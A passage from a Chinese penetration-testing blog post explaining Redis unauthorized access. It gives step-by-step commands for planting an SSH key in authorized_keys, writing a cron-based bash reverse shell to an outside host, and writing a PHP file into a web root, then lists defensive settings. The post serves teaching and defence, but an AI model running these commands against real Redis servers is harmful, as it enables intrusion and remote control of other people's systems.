<h4 id="3-smembers-返回集合的所有成员"><a href="#3-smembers-返回集合的所有成员" class="headerlink" title="3.smembers 返回集合的所有成员"></a><strong>3.smembers 返回集合的所有成员</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; smembers set1
1) &quot;new&quot;
2) &quot;age&quot;
3) &quot;old&quot;
4) &quot;K0rz3n&quot;
</code></pre>
<h4 id="4-sismember-判断是否是集合的成员"><a href="#4-sismember-判断是否是集合的成员" class="headerlink" title="4.sismember 判断是否是集合的成员"></a><strong>4.sismember 判断是否是集合的成员</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; sismember set1 age
(integer) 1
127.0.0.1:6379&gt; sismember set1 hh
(integer) 0
</code></pre>
<h2 id="0X05-数据的备份与恢复"><a href="#0X05-数据的备份与恢复" class="headerlink" title="0X05 数据的备份与恢复"></a><strong>0X05 数据的备份与恢复</strong></h2><p>Redis SAVE 命令用于创建当前数据库的备份。</p>
<p>直接在命令行输入 save 就能在 config dir 指定的目录中创建一个 dump.rdb 文件</p>
<blockquote>
<p><strong>注意：</strong></p>
<p>创建 redis 备份文件也可以使用命令 BGSAVE，该命令在后台执行。</p>
</blockquote>
<h2 id="0X06-Redis-在渗透测试中的利用"><a href="#0X06-Redis-在渗透测试中的利用" class="headerlink" title="0X06 Redis 在渗透测试中的利用"></a><strong>0X06 Redis 在渗透测试中的利用</strong></h2><h3 id="1-Redis-未授权访问："><a href="#1-Redis-未授权访问：" class="headerlink" title="1.Redis 未授权访问："></a><strong>1.Redis 未授权访问：</strong></h3><h4 id="1-漏洞描述："><a href="#1-漏洞描述：" class="headerlink" title="1.漏洞描述："></a><strong>1.漏洞描述：</strong></h4><p>在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。部分 Redis 绑定在 0.0.0.0:6379，并且没有开启密码认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。</p>
<h4 id="2-利用-Redis-获取敏感信息"><a href="#2-利用-Redis-获取敏感信息" class="headerlink" title="2.利用 Redis 获取敏感信息"></a><strong>2.利用 Redis 获取敏感信息</strong></h4><h5 id="1-Info"><a href="#1-Info" class="headerlink" title="(1)Info"></a><strong>(1)Info</strong></h5><p>如果 Redis 未授权访问成功(默认是空口令)，我们就能直接使用 Info 命令获取 Redis 以及系统的信息</p>
<p><strong>如题所示：</strong></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E4%BF%A1%E6%81%AF.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
<h5 id="2-keys-get-key"><a href="#2-keys-get-key" class="headerlink" title="(2)keys * &#x2F; get key"></a><strong>(2)keys * &#x2F; get key</strong></h5><p>我们能获取所有的键以及对应的值（使用 keys *  和  get key 命令）</p>
<p><strong>如图所示：</strong></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/key%20%E4%BF%A1%E6%81%AF.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
<h4 id="3-写公钥直接-ssh-连接"><a href="#3-写公钥直接-ssh-连接" class="headerlink" title="3.写公钥直接 ssh 连接"></a><strong>3.写公钥直接 ssh 连接</strong></h4><h5 id="1-原理分析："><a href="#1-原理分析：" class="headerlink" title="1.原理分析："></a><strong>1.原理分析：</strong></h5><p>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为&#x2F;root&#x2F;.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以再服务器端的&#x2F;root&#x2F;.ssh下生一个授权的key。</p>
<h5 id="2-大致的流程图如下"><a href="#2-大致的流程图如下" class="headerlink" title="2.大致的流程图如下"></a><strong>2.大致的流程图如下</strong></h5><p><strong>如图所示：</strong></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%86%99%E5%85%AC%E9%92%A51.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
<h5 id="2-测试开始："><a href="#2-测试开始：" class="headerlink" title="2.测试开始："></a><strong>2.测试开始：</strong></h5><p>我在我的 vps 上开放了一个 docker 配置 redis 为未授权访问状态，将 docker 的 22 端口映射为 Vps 的 20002 端口，docker 的 6379 端口映射为 60009 端口</p>
<p><strong>1.首先在本地生成 ssh 公私钥</strong></p>
<pre><code class="hljs">ssh-keygen -t rsa
</code></pre>
<p><strong>如图所示：</strong></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5%E5%AF%B9.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
<p><strong>2.将公钥导出为一个文件</strong></p>
<pre><code class="hljs">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt
</code></pre>
<p>这里的换行符是防止密钥数据和其他的 redis 缓存数据混合</p>
<p><strong>如图所示：</strong></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%AF%BC%E5%87%BA%E4%B8%BA%E6%96%87%E4%BB%B6.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
<p><strong>3.访问 redis 的同时将某个键的值设置为文件的内容</strong></p>
<pre><code class="hljs">cat /root/.ssh/key.txt | ./redis-cli -h xxx.xxx.xxx.xxx -p 60009 -x set xxx
</code></pre>
<p><strong>如图所示：</strong></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%99%E5%85%A5%E9%94%AE%E5%80%BC.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
<p><strong>4.改变 redis 的 RDB 目录以及文件为 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</strong></p>
<pre><code class="hljs">config set dir /root/.ssh

config set dbfilename authorized_keys
</code></pre>
<p><strong>如图所示：</strong></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%94%B9%E5%8F%98%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
<p>并且我们可以看到我们的 key.txt 已经存储在了 键为 hacker 的字符串 value 里面</p>
<p><strong>5.将缓存数据(key.txt 和其他的一些 redis 本身的缓存)写入磁盘文件</strong></p>
<pre><code class="hljs">save
</code></pre>
<p><strong>6.成功无密码登录 docker</strong></p>
<p><strong>如图所示：</strong></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%88%90%E5%8A%9F%E6%97%A0%E5%AF%86%E7%A0%81%E7%99%BB%E5%85%A5.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
<p><strong>7.我们看一下写入的文件的内容</strong></p>
<p><strong>如图所示：</strong></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%99%E5%85%A5%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
<h4 id="4-利用-crontable-反弹shell"><a href="#4-利用-crontable-反弹shell" class="headerlink" title="4.利用 crontable 反弹shell"></a><strong>4.利用 crontable 反弹shell</strong></h4><p>这个利用和上面的利用是一样的方法只不过是换了一下写入文件的路径以及写进去的内容</p>
<h5 id="1-端口监听"><a href="#1-端口监听" class="headerlink" title="1.端口监听"></a><strong>1.端口监听</strong></h5><p>我先在我另一台 vps 上监听 9999 端口</p>
<pre><code class="hljs">nc -lvv 9999
</code></pre>
<p><strong>如图所示：</strong></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AB%AF%E5%8F%A3%E7%9B%91%E5%90%AC.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
<h5 id="2-设置某一个键的值为符合-crontable-格式的反弹-shell-一句话"><a href="#2-设置某一个键的值为符合-crontable-格式的反弹-shell-一句话" class="headerlink" title="2.设置某一个键的值为符合 crontable 格式的反弹 shell 一句话"></a><strong>2.设置某一个键的值为符合 crontable 格式的反弹 shell 一句话</strong></h5><pre><code class="hljs">set hacker &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/9999 0&gt;&amp;1\n\n&quot;
</code></pre>
<p><strong>如图所示：</strong></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BE%E7%BD%AE%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
<h5 id="3-改变路径和文件名为-var-spool-cron-root"><a href="#3-改变路径和文件名为-var-spool-cron-root" class="headerlink" title="3.改变路径和文件名为 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root"></a><strong>3.改变路径和文件名为 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</strong></h5><pre><code class="hljs">config set dir /var/spool/cron
config set dbfilename root
save
</code></pre>
<p><strong>如图所示：</strong></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BE%E7%BD%AE%20cron%20%E8%B7%AF%E5%BE%84.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
<h5 id="4-等待"><a href="#4-等待" class="headerlink" title="4.等待"></a><strong>4.等待</strong></h5><p>这里解释一下为什么要写成 root 因为&#x2F;var&#x2F;spool&#x2F;cron&#x2F; 这个目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名，比如tom建的crontab任务对应的文件就是&#x2F;var&#x2F;spool&#x2F;cron&#x2F;tom。一般一个用户最多只有一个crontab文件。</p>
<h4 id="5-利用-Redis-写-webshell"><a href="#5-利用-Redis-写-webshell" class="headerlink" title="5. 利用 Redis 写 webshell"></a><strong>5. 利用 Redis 写 webshell</strong></h4><h5 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a><strong>1.概述</strong></h5><p>我一开始也说了， redis 和 memcached 的很大区别就在于他能将数据持久化存储(虽然两个的侧重点都在缓存而不是将数据存储在硬盘上，但是他就是支持)，这个性质对我们来说是非常好的，我们可以利用这个写入磁盘的性质实现 写入我们的 shell </p>
<p>我之前提到了 <strong>RDB</strong> 和 <strong>AOF</strong> 这两个机制就是我们写文件的基础，RDB 像一个数据库备份文件，而AOF是一个log日志文件。我们可以设置让 redis 在指定时间、指定更改次数时进行备份，生成RDB文件；而设置AOF，可以在操作或时间过程后将“日志”写入一个文件的最末，当操作越来越多，则AOF文件越来越大。二者是相辅相成的，通过二者的配合我们能够稳定地持久地将数据存储于服务器上。</p>
<h5 id="2-测试"><a href="#2-测试" class="headerlink" title="2.测试"></a><strong>2.测试</strong></h5><p>这个 webshell 的写入方法非常的类似于 MYSQL 利用  general log 写 shell 的方式，如果你还不了解 mysql 的写入 shell 的方式 可以参考我的这篇文章 ：<a target="_blank" rel="noopener" href="http://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/">Mysql 在渗透测试中的利用</a></p>
<h5 id="1-写入-webshell"><a href="#1-写入-webshell" class="headerlink" title="1.写入 webshell"></a><strong>1.写入 webshell</strong></h5><pre><code class="hljs">127.0.0.1:6379&gt; config set dir E:/phpstudy/PHPTutorial/WWW/
OK
127.0.0.1:6379&gt; config set dbfilename redis.php
OK
127.0.0.1:6379&gt; set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
OK
</code></pre>
<h4 id="2-访问测试"><a href="#2-访问测试" class="headerlink" title="2.访问测试"></a><strong>2.访问测试</strong></h4><p><strong>如图所示：</strong></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%99shell.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
<h2 id="0X07-如何防御"><a href="#0X07-如何防御" class="headerlink" title="0X07 如何防御"></a><strong>0X07 如何防御</strong></h2><h3 id="方法一：禁用高危命令（重启redis才能生效）"><a href="#方法一：禁用高危命令（重启redis才能生效）" class="headerlink" title="方法一：禁用高危命令（重启redis才能生效）"></a><strong>方法一：禁用高危命令（重启redis才能生效）</strong></h3><p>在 redis.conf 文件中直接将危险命令置空，或者改变其名字</p>
<pre><code class="hljs">rename-command FLUSHALL &quot;&quot;
rename-command CONFIG &quot;&quot;
rename-command EVAL &quot;&quot;
</code></pre>
<p>或者</p>
<pre><code class="hljs">rename-command FLUSHALL &quot;name1&quot;
rename-command CONFIG &quot;name2&quot;
rename-command EVAL &quot;name3&quot;
</code></pre>
<h3 id="方法二：以低权限运行-Redis-服务（重启redis才能生效）"><a href="#方法二：以低权限运行-Redis-服务（重启redis才能生效）" class="headerlink" title="方法二：以低权限运行 Redis 服务（重启redis才能生效）"></a><strong>方法二：以低权限运行 Redis 服务（重启redis才能生效）</strong></h3><p>我们知道进程的权限就是启动进程用户的权限，所以我们单独给 redis 开一个用户，这样不是 root 很多的操作都不能做了（方法类似于 apache 的降权运行防止 getshell 以后删除整站）</p>
<pre><code class="hljs">groupadd -r redis   
useradd -r -g redis redis
</code></pre>
<h3 id="方法三：为-Redis-添加密码验证（重启redis才能生效）"><a href="#方法三：为-Redis-添加密码验证（重启redis才能生效）" class="headerlink" title="方法三：为 Redis 添加密码验证（重启redis才能生效）"></a><strong>方法三：为 Redis 添加密码验证（重启redis才能生效）</strong></h3><p>我觉得这个方法是最最核心的，因为默认的密码是空，然后不改的话就是直接被打</p>
<p>修改 redis.conf 文件，添加</p>
<pre><code class="hljs">requirepass mypassword
</code></pre>
<h3 id="方法四：禁止外网访问-Redis（重启redis才能生效）"><a href="#方法四：禁止外网访问-Redis（重启redis才能生效）" class="headerlink" title="方法四：禁止外网访问 Redis（重启redis才能生效）"></a><strong>方法四：禁止外网访问 Redis（重启redis才能生效）</strong></h3><p>这个措施配合设置密码，一般来讲就没有什么大的问题， 就怕这个设置了结果密码没设置，万一出了 SSRF 照打不误</p>
<p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用（<strong>当然你设置成当前主机可用的话，安全性就更高了</strong>）</p>
<pre><code class="hljs">bind 127.0.0.1
</code></pre>
<blockquote>
<p><strong>注意：</strong></p>
<p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</p>
</blockquote>
<h3 id="方法五：修改默认端口"><a href="#方法五：修改默认端口" class="headerlink" title="方法五：修改默认端口"></a><strong>方法五：修改默认端口</strong></h3><p>这个方式就是不给攻击者试探的机会，反正就是增大了测试的难度</p>
<p>修改配置文件redis.conf文件</p>
<pre><code class="hljs">Port 6379
</code></pre>
<h3 id="方法五：设置文件的隐藏属性"><a href="#方法五：设置文件的隐藏属性" class="headerlink" title="方法五：设置文件的隐藏属性"></a><strong>方法五：设置文件的隐藏属性</strong></h3><p>我们上面的利用中有一个利用的是修改 authorized_keys ，为了避免这种情况，我们需要控制这个文件无法被篡改，这就涉及到 Linux 中的文件的隐藏属性的知识点</p>
<h4 id="两个比较重要的命令："><a href="#两个比较重要的命令：" class="headerlink" title="两个比较重要的命令："></a><strong>两个比较重要的命令：</strong></h4><pre><code class="hljs">chattr：change file attributes

lsattr：list file attributes
</code></pre>
<h4 id="两个比较重要的参数："><a href="#两个比较重要的参数：" class="headerlink" title="两个比较重要的参数："></a><strong>两个比较重要的参数：</strong></h4><h5 id="a-参数："><a href="#a-参数：" class="headerlink" title="a 参数："></a><strong>a 参数：</strong></h5><p>设置了a参数时，文件中将只能增加内容，不能删除数据，且不能打开文件进行任何编辑，哪怕是追加内容也不可以，所以像sed等需要打开文件的再写入数据的工具也无法操作成功。文件也不能被删除。只有root才能设置。</p>
<h5 id="i-参数："><a href="#i-参数：" class="headerlink" title="i 参数："></a><strong>i 参数：</strong></h5><p>设置了i参数时，文件将被锁定，不能向其中增删改内容，也不能删除修改文件等各种动作。只有root才能设置。可以将其理解为设置了i后，文件将是永恒不变的了，谁都不能动它。</p>
<p>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</p>
<pre><code class="hljs">chmod 400 ~/.ssh/authorized_keys
</code></pre>
<p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限:</p>
<pre><code class="hljs">chattr +i ~/.ssh/authorized_keys
</code></pre>
<p>然而，用户还可以重命名 ~&#x2F;.ssh，然后新建新的 ~&#x2F;.ssh 目录和 authorized_keys<br>文件。要避免这种情况，需要设置 ~.&#x2F;ssh 的 immutable 权限：</p>
<pre><code class="hljs">chattr +i ~/.ssh
</code></pre>
<h3 id="方法六：设置防火墙策略"><a href="#方法六：设置防火墙策略" class="headerlink" title="方法六：设置防火墙策略"></a><strong>方法六：设置防火墙策略</strong></h3><p>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务</p>
<h2 id="0X07-总结"><a href="#0X07-总结" class="headerlink" title="0X07 总结"></a><strong>0X07 总结</strong></h2><p>本文主要是简单的介绍了一下 redi 并与其他类型数据库做了一些对比，利用 redis 能持久化存储的特性并结合 redis 的未授漏洞，尝试了几种不同的攻击方式，纸上得来终觉浅，绝知此事要躬行啊。 </p>
<h2 id="0X08-参考"><a href="#0X08-参考" class="headerlink" title="0X08 参考"></a><strong>0X08 参考</strong></h2><p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/118777.htm">https://www.jb51.net/article/118777.htm</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/158065.html">https://www.freebuf.com/column/158065.html</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%A4%87%E5%BF%98/" class="category-chain-item">备忘</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Redis-%E5%A4%87%E5%BF%98/" class="print-no-link">#Redis 备忘</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Redis 基础梳理以及其在渗透测试中的利用</div>
      <div>http://example.com/2018/11/08/Redis 基础梳理以及其在渗透测试中的利用/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>November 8, 2018</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
                  <span class="hint--top hint--rounded" aria-label="NC - Non-commercial">
                    <i class="iconfont icon-cc-nc"></i>
                  </span>
                </a>
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
                  <span class="hint--top hint--rounded" aria-label="SA - Share-alike">
                    <i class="iconfont icon-cc-sa"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/" title="一篇文章带你理解漏洞之 SSTI 漏洞">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">一篇文章带你理解漏洞之 SSTI 漏洞</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2018/11/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%9A%84%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%8F%E5%8E%86/" title="记一次真实的域渗透经历(从文件上传到拿下整个域控)">
                        <span class="hidden-mobile">记一次真实的域渗透经历(从文件上传到拿下整个域控)</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
